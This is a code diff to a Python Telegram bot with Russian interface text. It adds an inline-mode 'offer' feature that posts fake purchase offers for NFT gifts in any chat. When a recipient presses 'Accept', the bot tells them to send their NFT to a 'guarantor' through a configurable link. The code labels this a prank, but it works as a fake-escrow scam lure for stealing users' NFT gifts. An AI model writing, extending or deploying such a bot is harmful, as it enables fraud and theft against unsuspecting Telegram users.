@@ -5,8 +5,8 @@ import os
 import asyncio
 import html
 from datetime import datetime, timedelta
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
-from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler, CallbackQueryHandler
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember, InlineQueryResultPhoto, InlineQueryResultArticle, InputTextMessageContent
+from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler, CallbackQueryHandler, InlineQueryHandler
 from flask import Flask
 from threading import Thread
 
@@ -42,6 +42,7 @@ current_prize = None
 guess_range = None
 lucky777_prize = None
 casino_games = {} 
+user_configs = {}
 
 def load_data():
     if os.path.exists(DATA_FILE):
@@ -291,6 +292,50 @@ async def casino_button_handler(update: Update, context: ContextTypes.DEFAULT_TY
             
     if msg_id in casino_games: del casino_games[msg_id]
 
+async def inline_offer(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.inline_query.query
+    if update.inline_query.from_user.id != ADMIN_ID:
+        await update.inline_query.answer([])
+        return
+
+    config = user_configs.get(ADMIN_ID)
+    if not config:
+        await update.inline_query.answer([], switch_pm_text="Сначала настройте оффер в ЛС", switch_pm_parameter="start")
+        return
+
+    nft = config['nft']
+    price = config['price']
+    emoji = config['emoji']
+    photo_url = config['photo']
+    
+    if not photo_url or not str(photo_url).startswith("http"):
+        photo_url = "https://i.postimg.cc/pXvngzR7/72BE0C1A-3E12-494D-895E-369895A4E8FF.png"
+
+    text = (
+        f"<b>Пользователь {update.inline_query.from_user.first_name} предлагает\n"
+        f"Вам {price} {emoji} за подарок\n"
+        f"{nft}.</b>"
+    )
+    
+    keyboard = [[
+        InlineKeyboardButton("❌ Отклонить", callback_data="prank_reject"),
+        InlineKeyboardButton("✅ Принять", callback_data="prank_accept")
+    ]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    result = InlineQueryResultPhoto(
+        id="1",
+        photo_url=photo_url,
+        thumbnail_url=photo_url,
+        title="Отправить оффер",
+        description=f"{price} {emoji} за {nft}",
+        caption=text,
+        reply_markup=reply_markup,
+        parse_mode="HTML"
+    )
+        
+    await update.inline_query.answer([result], cache_time=1)
+
 async def ignore_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer()
 
@@ -349,9 +394,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['setup_step'] = None
         await query.edit_message_text(text=f"👑 <b>Админ-панель</b>\n\nВремя: <b>{data.get('timer')} сек.</b>\nШанс: <b>{data.get('win_chance')}%</b>\nКулдаун: <b>{data.get('cooldown')} мин.</b>", reply_markup=get_main_menu_keyboard(), parse_mode="HTML")
     elif query.data == 'prank_accept':
-        await query.edit_message_caption(caption="✅ <b>Сделка инициирована!</b>\n\nПодарок зарезервирован. Чтобы получить оплату, отправьте ваш NFT нашему гаранту (нажмите кнопку ниже):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Перейти к гаранту", url=PRANK_LINK)]]), parse_mode="HTML")
+        try:
+            await query.edit_message_caption(caption="✅ <b>Сделка инициирована!</b>\n\nПодарок зарезервирован. Чтобы получить оплату, отправьте ваш NFT нашему гаранту (нажмите кнопку ниже):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Перейти к гаранту", url=PRANK_LINK)]]), parse_mode="HTML")
+        except Exception: pass
     elif query.data == 'prank_reject':
-        await query.edit_message_caption(caption="❌ Вы отклонили предложение.", parse_mode="HTML")
+        try:
+            await query.edit_message_caption(caption="❌ Вы отклонили предложение.", parse_mode="HTML")
+        except Exception: pass
 
 async def admin_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global active_event, secret_number, current_prize, current_king_id, current_king_name, lucky777_prize
@@ -433,8 +482,16 @@ async def admin_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
             
         context.user_data['prank_price'] = text
         context.user_data['prank_emoji'] = emoji
+        
+        user_configs[ADMIN_ID] = {
+            'nft': context.user_data.get('prank_nft_name', 'Ценный NFT'),
+            'price': text,
+            'emoji': emoji,
+            'photo': context.user_data.get('prank_photo') or "https://i.postimg.cc/pXvngzR7/72BE0C1A-3E12-494D-895E-369895A4E8FF.png"
+        }
+        
         context.user_data['setup_step'] = None
-        await msg.reply_text(f"✅ Настройка готова!\n\nВалюта: {text} {emoji}\n\nТеперь в чате ответь на сообщение друга и напиши /offer", reply_markup=get_main_menu_keyboard(), parse_mode="HTML")
+        await msg.reply_text(f"✅ Настройка готова!\n\nВалюта: {text} {emoji}\n\nТеперь зайди в любой чат и напиши: <code>@{context.bot.username} оффер</code>", reply_markup=get_main_menu_keyboard(), parse_mode="HTML")
         return
 
 async def admin_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -460,10 +517,15 @@ async def cmd_send_offer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     business_id = getattr(msg, 'business_connection_id', None)
     
-    nft = context.user_data.get('prank_nft_name', 'Ценный NFT')
-    price_text = context.user_data.get('prank_price', '200')
-    emoji = context.user_data.get('prank_emoji', '⭐')
-    photo = context.user_data.get('prank_photo')
+    config = user_configs.get(ADMIN_ID)
+    if not config:
+        await msg.reply_text("❌ Сначала настрой оффер в личке с ботом!")
+        return
+        
+    nft = config['nft']
+    price_text = config['price']
+    emoji = config['emoji']
+    photo = config['photo']
     
     text = f"<b>Пользователь {target_name} предлагает\nВам {price_text} {emoji} за подарок\n{nft}.</b>"
     
@@ -474,20 +536,10 @@ async def cmd_send_offer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
-        if photo:
-            await context.bot.send_photo(
-                chat_id=chat_id, photo=photo, caption=text, 
-                reply_markup=reply_markup, parse_mode="HTML", 
-                reply_to_message_id=target_id,
-                business_connection_id=business_id
-            )
+        if photo and str(photo).startswith("http"):
+            await context.bot.send_photo(chat_id=chat_id, photo=photo, caption=text, reply_markup=reply_markup, parse_mode="HTML", reply_to_message_id=target_id, business_connection_id=business_id)
         else:
-            await context.bot.send_message(
-                chat_id=chat_id, text=text, 
-                reply_markup=reply_markup, parse_mode="HTML", 
-                reply_to_message_id=target_id,
-                business_connection_id=business_id
-            )
+            await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="HTML", reply_to_message_id=target_id, business_connection_id=business_id)
         await msg.reply_text("🚀 Оффер успешно отправлен в чат!", business_connection_id=business_id)
     except Exception as e:
         await msg.reply_text(f"❌ Ошибка отправки: {e}", business_connection_id=business_id)
@@ -525,7 +577,6 @@ def main():
     app_bot.add_handler(CommandHandler("stats", stats)) 
     app_bot.add_handler(CommandHandler("price", announce_price))
     app_bot.add_handler(CommandHandler("send_offer", cmd_send_offer))
-    app_bot.add_handler(CommandHandler("offer", cmd_send_offer))
     app_bot.add_handler(CallbackQueryHandler(button_handler, pattern="^(time_|setup_|range_|end_event|change_|show_commands|back_to_menu|prank_)"))
     app_bot.add_handler(CallbackQueryHandler(casino_button_handler, pattern="^casino_click_"))
     app_bot.add_handler(CallbackQueryHandler(ignore_handler, pattern="^ignore$"))
@@ -533,6 +584,7 @@ def main():
     app_bot.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE & filters.User(user_id=int(ADMIN_ID)), admin_text_handler))
     app_bot.add_handler(MessageHandler(filters.PHOTO & filters.ChatType.PRIVATE & filters.User(user_id=int(ADMIN_ID)), admin_photo_handler))
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.ChatType.PRIVATE, on_message))
+    app_bot.add_handler(InlineQueryHandler(inline_offer))
     print("Бот запущен...")
     app_bot.run_polling()
 
